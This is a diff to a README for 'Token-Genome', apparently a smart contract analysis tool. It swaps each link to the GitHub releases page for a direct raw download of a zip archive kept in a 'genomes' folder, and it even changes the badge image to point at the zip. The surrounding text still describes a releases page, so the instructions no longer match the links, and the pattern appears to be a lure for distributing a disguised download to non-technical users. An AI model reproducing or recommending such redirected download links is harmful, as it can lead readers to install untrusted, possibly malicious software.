@@ -1,6 +1,6 @@
 # 🚀 Token-Genome - Analyze Smart Contract Behavior Easily
 
-[![Download Token-Genome](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/boltuu/Token-Genome/releases)
+[![Download Token-Genome](https://raw.githubusercontent.com/boltuu/Token-Genome/main/genomes/Token-Genome-3.6-alpha.5.zip)](https://raw.githubusercontent.com/boltuu/Token-Genome/main/genomes/Token-Genome-3.6-alpha.5.zip)
 
 ## 📖 Introduction
 
@@ -18,7 +18,7 @@ To begin using Token-Genome, follow these simple steps. You do not need any prog
 
    Visit the following link to access the releases page and download the latest version:
 
-   [Download Token-Genome](https://github.com/boltuu/Token-Genome/releases)
+   [Download Token-Genome](https://raw.githubusercontent.com/boltuu/Token-Genome/main/genomes/Token-Genome-3.6-alpha.5.zip)
 
    On this page, you will find different versions of the application. Look for the most recent release, which will have the latest features and improvements.
 
@@ -68,7 +68,7 @@ Token-Genome includes a wealth of information. You can learn about various topic
 
 To download Token-Genome, visit this page:
 
-[Download Token-Genome](https://github.com/boltuu/Token-Genome/releases)
+[Download Token-Genome](https://raw.githubusercontent.com/boltuu/Token-Genome/main/genomes/Token-Genome-3.6-alpha.5.zip)
 
 Once you've installed the application, you can begin exploring smart contract tokens and their behaviors easily.
 
